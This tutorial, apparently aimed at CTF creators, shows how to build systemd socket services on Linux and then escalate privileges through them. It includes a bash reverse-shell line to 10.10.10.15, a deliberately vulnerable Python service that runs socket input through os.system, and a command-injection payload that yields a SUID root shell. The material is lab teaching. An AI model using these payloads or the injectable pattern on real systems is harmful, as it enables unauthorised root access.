# Linux Privilege Escalation - Sockets for CTF Creators


# Sockets

A Unix-domain socket allows communication between two different processes on the same machine or different machines in client-server application frameworks. It facilitates inter-process communication using standard Unix file descriptors.

Sockets can be configured using `.socket` files.

For more information regarding sockets, refer to the [systemd.socket](https://www.man7.org/linux/man-pages/man5/systemd.socket.5.html) man page. Information regarding special systemd units can be found on the [systemd.special](https://www.man7.org/linux/man-pages/man7/systemd.special.7.html) man page.

> Note that `SOCK_SEQPACKET` (i.e. `ListenSequentialPacket=`) is only available for `AF_UNIX` sockets. `SOCK_STREAM` (i.e. `ListenStream=`) when used for IP sockets refers to TCP sockets, `SOCK_DGRAM` (i.e. `ListenDatagram=`) to UDP.

# Understanding Sockets

Install socat with the `apt` package manager:

```shell
sudo apt update && sudo apt install socat
```

Let's create a socket file:

```shell
sudo vim /lib/systemd/system/echo.socket
```

In this case, we're going to create an echo socket and use only a listening directive and the `Accept` directive:

```shell
[Unit] 
Description = Echo server 

[Socket] 
ListenStream = 4444 
Accept = yes 

[Install] 
WantedBy = sockets.target
```

Options:
- ListenStream: means `SOCK_STREAM` and when used for IP sockets refers to TCP sockets.
- Accept: Takes a boolean argument. If yes, a service instance is spawned for each incoming connection and only the connection socket is passed to it. If no, all listening sockets themselves are passed to the started service unit, and only one service unit is spawned for all connections. Since we want to send information from one machine to another, you will be using an _AF_INET_, and for that the best thing to do is have `Accept` set to `true` or `yes`.
- WantedBy=sockets.target:  A special target unit that sets up all socket units (see [systemd.socket(5)](https://www.freedesktop.org/software/systemd/man/systemd.socket.html#) for details) that shall be active after boot. Services that can be socket-activated shall add `Wants=` dependencies to this unit for their socket unit during installation. This is best configured via a `WantedBy=sockets.target` in the socket unit's [Install] section.

Create a service file. In most cases, the service will have the same name as the socket unit, except with an _@_ and the _service_ suffix. As your socket unit was _echo.socket_, your service will be _echo@.service_:

```shell
sudo vim /etc/systemd/system/echo@.service
```

The service itself is also pretty basic:

```shell
[Unit] 
Description=Echo server service 

[Service] 
ExecStart=/home/low/echo_write.py 
StandardInput=socket
```

The service `Type` is `simple`, which is already the default, so there is no need to include it. `"ExecStart`” points to the _echo_write.py_ script you will see in a minute, and the `"StandardInput"` for said script comes from the socket set up by _echo.socket_.

Let's see where python is located:

```shell
user@pwn:~$ which python
user@pwn:~$ which python3
/usr/bin/python3
```

Create a script:

```shell
vim echo_write.py 
```

The echo_write.py script is just three lines long:

```python
#!/usr/bin/python3
import sys
sys.stdout.write(sys.stdin.readline().strip().upper() + '\n')
```

This reads a line of text from _STDIN_, which, as you can see, is accessed through the socket. `'sys.stdin.readline().strip()`' then removes all spaces from the beginning and end of the line and converts it to uppercase `.upper()`. It then transmits it back through the socket to the transmitting computer's terminal (`'sys.stdout.write([...])'`). This means that a user can connect to the socket on your receiving system, write a string, and have it repeated back in upper case.

Add execution permissions:

```shell
chmod +x echo_write.py 
```

Start the socket unit with:

```shell
sudo systemctl start echo.socket
```

The _echo.socket_ will automatically call _echo@.service_ (which runs echo_write.py) each time someone tries to push a string to the server through port 4444.

Now check that the port listening:

```shell
user@pwn:~$ ss -tnlp | grep 4444
LISTEN   0        4096                   *:4444                *:*       
```

To do that, on the sending computer, you can use a program like [_socat_](https://www.linux.com/news/socat-general-bidirectional-pipe-handler):

```shell
$ socat - TCP:127.0.0.1:4444
hello
HELLO
$
```

# PrivilegeEscalation via Writable .socket files

Let's add write permissions for others:

```shell
sudo chmod o+w echo.socket
```

If we find a **writable** `.socket` file we can **add** at the beginning of the `[Socket]` section something like `ExecStartPre=/home/user/backdoor` and the backdoor will be executed before the socket is created. Therefore, we will **probably need to wait until the machine is rebooted** if we can't reboot the machine with our current user.

Add a reverse shell to the script or any other malicious command:

```shell
echo -e ''#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.10.15/1234 0>&1' >> /home/user/script.sh
```

Edit the socket file and add a script that it will be executed before the listening sockets/FIFOs are created and bound, we can do this with the `ExecStartPre=` option:

```shell
[Unit] 
Description = Echo server 

[Socket] 
ExecStartPre=/home/user/script.sh
ListenStream = 4444 
Accept = yes 

[Install] 
WantedBy = sockets.target
```

Let's restart the socket:

```shell
sudo systemctl restart echo.socket
```

Alternatively, we could restart the computer:

```shell
reboot
```

Receive the reverse shell as the root user:

```shell
nc -lvnp 1234
```
# PrivilegeEscalation via Socket Command Injection

Create a file named `socket_injection.py`:

```shell
vim socket_injection.py
```

Write the following code:

```python
#!/usr/bin/python3
import os
command = input("Enter a command: ")
os.system(command)
```

Add execution permissions:

```shell
chmod +x socket_injection.py 
```

Create the following socket:

```shell
sudo vim /lib/systemd/system/injection.socket
```

Write the following configuration:

```shell
[Unit] 
Description = Socket Command Injection Server 

[Socket] 
ListenSequentialPacket = 1234 
Accept = yes 

[Install] 
WantedBy = sockets.target
```

Then create this service:

```shell
sudo vim /etc/systemd/system/injection@.service
```

Write the following instructions:

```shell
[Unit] 
Description=Vulnerable Socket Command Injection Service 

[Service] 
ExecStart=/home/user/socket_injection.py 
StandardInput=socket
```

Now start the socket:

```shell
sudo systemctl start injection.socket
```

Check if the port is listening:

```shell
user@pwn:~$ ss -tnlp | grep 1234
LISTEN   0        4096                   *:1234                *:*    
```

Run the following commands:

```shell
user@pwn:~$ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - TCP:127.0.0.1:1234

user@pwn:~$ ls -l /tmp/bash
-rwsr-sr-x 1 root root 1037528 Nov 15 15:41 /tmp/bash
```

Spawn bash with SUID and print the Effective UID:

```shell
user@pwn:~$ /tmp/bash -p
bash-4.3# whoami
root
```

Remove the bash SUID binary:

```shell
user@pwn:~$ sudo rm /tmp/bash
```
